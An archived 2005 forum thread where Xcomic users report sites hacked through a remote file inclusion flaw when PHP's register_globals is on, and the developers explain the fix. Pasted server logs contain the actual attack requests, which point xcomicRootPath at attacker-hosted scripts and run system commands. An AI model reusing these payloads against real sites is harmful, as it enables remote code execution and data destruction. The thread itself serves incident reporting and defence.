

[![Wayback Machine](/_static/images/toolbar/wayback-toolbar-logo-200.png)](/web/ "Wayback Machine home page")

[1 capture](/web/20071218144304%2A/http%3A//xcomic.mikexstudios.com/forum/viewtopic.php?id=130 "See a list of every capture for this URL")
18 Dec 2007

| Nov | DEC | Jan |
| Previous capture | 18 | Next capture |
| 2006 | 2007 | 2008 |

success
fail

 [About this capture](#expand)

COLLECTED BY

Organization: [Internet Archive](https://archive.org/details/webwidecrawl)

The Internet Archive discovers and captures web pages through many different web crawls.
At any given time several distinct crawls are running, some for months, and some every day or longer.
View the web archive through the [Wayback Machine](http://archive.org/web/web.php).

Collection: [Around The World Crawl](https://archive.org/details/aroundtheworldcrawl)

Data crawled by Sloan Foundation on behalf of Internet Archive

TIMESTAMPS

![loading](/_static/images/loading.gif)

The Wayback Machine - https://web.archive.org/web/20071218144304/http://xcomic.mikexstudios.com/forum/viewtopic.php?id=130

# Xcomic Forums

Discussion about Xcomic: A Comic Management Script

* [Index](index.php)
* [User list](userlist.php)
* [Search](search.php)
* [Register](register.php)
* [Login](login.php)

You are not logged in.

Pages: **1**

* [Index](index.php)
* » [Bug Report](viewforum.php?id=8)
* » Security Flaw?

## #1 [2005-07-20 10:19:29](viewtopic.php?pid=828#p828)

**[Kevin](profile.php?id=15)**
**Member**

Registered: 2005-02-20
Posts: 10

### Security Flaw?

Hey guys. . .
I revently found a copy of the Dextenea trojan in my xcomic directory. I erased it, and searched through the server logs to find:

62.162.237.98 - - [19/Jul/2005:22:55:46 -0400] "GET /initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd= HTTP/1.1" 200 17130 simulatedcomicproduct.com "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" "-"
62.162.237.98 - - [19/Jul/2005:22:55:54 -0400] "POST /initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd= HTTP/1.1" 200 18214 simulatedcomicproduct.com "http://simulatedcomicproduct.com/initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd=" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" "-"
62.162.237.98 - - [19/Jul/2005:22:56:15 -0400] "POST /initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd= HTTP/1.1" 200 18980 simulatedcomicproduct.com "http://simulatedcomicproduct.com/initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd=" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" "-"
62.162.237.98 - - [19/Jul/2005:22:56:41 -0400] "POST /initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd= HTTP/1.1" 200 17392 simulatedcomicproduct.com "http://simulatedcomicproduct.com/initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd=" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" "-"

If you grab the file that was injected, it's a javascript program.

I also noticed some weird searches the other day - people were looking for the phrase "powered by xcomic".

Is there a problem with initialize.php?

Offline

## #2 [2005-07-20 22:55:47](viewtopic.php?pid=831#p831)

**[Aelice](profile.php?id=55)**
**New member**

Registered: 2005-07-08
Posts: 5

### Re: Security Flaw?

I also noticed some weird searches the other day - people were looking for the phrase "powered by xcomic". <<

Got that message as well in my tracker. Weird.

*Last edited by Aelice (2005-07-20 22:56:01)*

Offline

## #3 [2005-07-20 23:21:44](viewtopic.php?pid=832#p832)

**[keamos](profile.php?id=12)**
**Administrator**
![](/web/20071218144304im_/http://xcomic.mikexstudios.com/forum/img/avatars/12.gif)
From: Norwich, CT
Registered: 2005-02-14
Posts: 166
[Website](https://web.archive.org/web/20071218144304/http%3A//sephiroth.phoenixinquis.net/)

### Re: Security Flaw?

> #### Kevin wrote:
>
> Hey guys. . .
> I revently found a copy of the Dextenea trojan in my xcomic directory. I erased it, and searched through the server logs to find:
>
> 62.162.237.98 - - [19/Jul/2005:22:55:46 -0400] "GET /initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd= HTTP/1.1" 200 17130 simulatedcomicproduct.com "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" "-"
> 62.162.237.98 - - [19/Jul/2005:22:55:54 -0400] "POST /initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd= HTTP/1.1" 200 18214 simulatedcomicproduct.com "http://simulatedcomicproduct.com/initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd=" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" "-"
> 62.162.237.98 - - [19/Jul/2005:22:56:15 -0400] "POST /initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd= HTTP/1.1" 200 18980 simulatedcomicproduct.com "http://simulatedcomicproduct.com/initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd=" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" "-"
> 62.162.237.98 - - [19/Jul/2005:22:56:41 -0400] "POST /initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd= HTTP/1.1" 200 17392 simulatedcomicproduct.com "http://simulatedcomicproduct.com/initialize.php?xcomicRootPath=http://www.terrymorris.com/php.jpg?&cmd=" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" "-"
>
> If you grab the file that was injected, it's a javascript program.
>
> I also noticed some weird searches the other day - people were looking for the phrase "powered by xcomic".
>
> Is there a problem with initialize.php?

There's no problem with it if your server does the secure thing and runs register\_globals off, from what I can tell.

[edit]
Yeah, to the asshole who thinks he's going to exploit me--
201.9.99.155 - - [21/Jul/2005:01:57:16 -0400] "GET /xcomic/Xcomic.php?xcomicRootPath=http://ekart.kocaali.com/ekart/.asc/.xpl/asc.txt?&cmd=uname%20-a;w;id;pwd;ps HTTP/1.1" 404 303
201.9.99.155 - - [21/Jul/2005:01:57:29 -0400] "GET /xcomic/initialize.php?xcomicRootPath=http://ekart.kocaali.com/ekart/.asc/.xpl/asc.txt?&cmd=uname%20-a;w;id;pwd;ps HTTP/1.1" 404 307

Eat shit; I'm not stupid enough to run r\_g on for no reason.

[edit #2]
Here's what you get with the proper R\_G setting, off;

![http://img323.imageshack.us/img323/8651/xcomicflaw0ch.th.jpg](https://web.archive.org/web/20071218144304im_/http://img323.imageshack.us/img323/8651/xcomicflaw0ch.th.jpg)

*Last edited by keamos (2005-07-21 00:29:47)*

---

"The idea that I can be presented with a problem, set out to logically solve it with the tools at hand, and wind up with a program that could not be legally used because someone else followed the same logical steps some years ago and filed for a patent on it is horrifying." - John Carmack

[08:06:37PM] Aelice: I've been so stressing over getting this to work. XD You programmers are masochistic.

Offline

## #4 [2005-07-21 09:04:55](viewtopic.php?pid=833#p833)

**[Kevin](profile.php?id=15)**
**Member**

Registered: 2005-02-20
Posts: 10

### Re: Security Flaw?

Arrrgh! My site has been hacked. I guess that my server was running with r\_g on. I made a patch for initialize.php to fix it, but then they tried admin\_initialize, and erased EVERYTHING on my server.

Maybe there should be a patch so that xcomic's security doesnt' rely upon r\_g.

Offline

## #5 [2005-07-21 10:13:44](viewtopic.php?pid=834#p834)

**[Nalina](profile.php?id=63)**
**New member**

Registered: 2005-07-21
Posts: 2

### Re: Security Flaw?

This just happened to my site, Geekymonkeys.com ![hmm](/web/20071218144304im_/http://xcomic.mikexstudios.com/forum/img/smilies/hmm.png)  They deleted alla xcomic and my real index ![hmm](/web/20071218144304im_/http://xcomic.mikexstudios.com/forum/img/smilies/hmm.png) Luckily that seemed to be the extent of the damage (thank goodness .. I would not have been happy to have to reinstall everything >.<; ) ..  But yeah logs full of this sorta stuff:

82.61.72.160 - - [21/Jul/2005:09:03:11 -0400] "GET /admin/admininitialize.php?xcomicRootPath=http://ekart.kocaali.com/ekart/.asc/.xpl/asc.txt?&cmd=uname%20-a;w;id;pwd;ps;echo%20\"ASC%20r0x\" HTTP/1.1" 404 310 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; Win64; x64; SV1)"

Url looks rather familiar there ne? ;P

What can I do to stop this from happening again? For now I change the 'powered by xcomic' a the bottom to at least hopefully slow websearches down ... but now that they know the site ... I don't know a whole lot about php beyond being able to make it work ![hmm](/web/20071218144304im_/http://xcomic.mikexstudios.com/forum/img/smilies/hmm.png) So any help would be appreatiated.

Offline

## #6 [2005-07-21 13:17:19](viewtopic.php?pid=836#p836)

**[mlaboss](profile.php?id=45)**
**New member**

Registered: 2005-06-22
Posts: 6

### Re: Security Flaw?

I am concerned about this as I noticed a recent referral to my site from a Google search for "powered by xcomic".  As far as I know there was no hacking attempt, at least not a successful one.  How do I check whether this register\_globals thing is on or off on my server?

Offline

## #7 [2005-07-21 13:18:32](viewtopic.php?pid=837#p837)

**[mikexstudios](profile.php?id=2)**
**Administrator**

From: PA, USA
Registered: 2005-01-30
Posts: 241
[Website](https://web.archive.org/web/20071218144304/http%3A//www.mikexstudios.com/)

### Re: Security Flaw?

Hi Kevin and Nalina,

Thank you very much for letting us know about this exploit. As Mike C. stated, the attackers were able to exploit your system because PHP on your servers is running with register\_globals on which is a really bad configuration.

Xcomic does not rely on register\_globals. In fact, register\_globals shouldn't even be turned on since it poses such a security threat to not just Xcomic but to many other PHP scripts.

There will be a patch issued by tomorrow since we want to do some testing before releasing it. In the meanwhile, if your server allows overridding PHP settings, [download this file, unzip the .htaccess file](https://web.archive.org/web/20071218144304/http%3A//labs.mikexstudios.com/Xcomic_globals_off.zip), and upload it to the root directory of your Xcomic installation (where Xcomic.php and initialize.php are).

Essentially the .htaccess file contains:
php\_flag register\_globals off
which tells php to turn register\_globals off.

I hope that helps for the time being. Otherwise, you can chmod your whole Xcomic folder to 700 to shut down the site for the time.

Michael Huynh

Offline

## #8 [2005-07-21 13:46:07](viewtopic.php?pid=838#p838)

**[Kevin](profile.php?id=15)**
**Member**

Registered: 2005-02-20
Posts: 10

### Re: Security Flaw?

I restored my site from a backup and kludged in a fix for the home directory variable in my initialize and admin\_initialize files.
I also turned off register\_globals on my server. I'm not sure why my isp had it on my default. At any rate, I had to use a php.ini file instead of htacess, because they are using php through cgi.

Offline

## #9 [2005-07-21 14:09:39](viewtopic.php?pid=839#p839)

**[Nalina](profile.php?id=63)**
**New member**

Registered: 2005-07-21
Posts: 2

### Re: Security Flaw?

Thanks for the response! ![smile](/web/20071218144304im_/http://xcomic.mikexstudios.com/forum/img/smilies/smile.png) I did manage to google a bit and found out more about the register\_globals ... I tried desperately to use a .htaccess file to turn it off, but to no success (at least I don't think it was working if I was using phpinfo correctly...) .. which, from what I could gather, does happen ... something to do with apache and php having to have been installed as a module? or a override setting had to be set .. something over my head like that lol. But luckily my server is decent enough it seems to let me access my own php.ini so I turned it off there and that did it  .. and didn't seem to upset the other php programs on the site (which had been a bit of my worry) ... So should survive till tomorrow I'd imagine. ![smile](/web/20071218144304im_/http://xcomic.mikexstudios.com/forum/img/smilies/smile.png)  Definetly gonna make sure I watch for that setting in the future lol ...

mlaboss: I found out it was on by digging around my server for the Php.ini file .. just then do a find in the file for it. I found my php.ini in /etc/ dir. You can also use phpinfo to check the setting ... [http://us2.php.net/phpinfo](https://web.archive.org/web/20071218144304/http%3A//us2.php.net/phpinfo)

*Last edited by Nalina (2005-07-21 14:21:01)*

Offline

## #10 [2005-07-21 15:05:13](viewtopic.php?pid=840#p840)

**[mlaboss](profile.php?id=45)**
**New member**

Registered: 2005-06-22
Posts: 6

### Re: Security Flaw?

Thanks Nalina, I was able to find the php.ini file and register\_globals is set to off.

*Last edited by mlaboss (2005-07-21 15:05:25)*

Offline

Pages: **1**

## Board footer

Jump to

General Xcomic Discussion

Installation Help
How-to and Troubleshooting

Bug Report
Feature Requests and Feedback
Miscellaneous Code

SPAM

Powered by [PunBB](https://web.archive.org/web/20071218144304/http%3A//www.punbb.org/)
© Copyright 2002–2005 Rickard Andersson

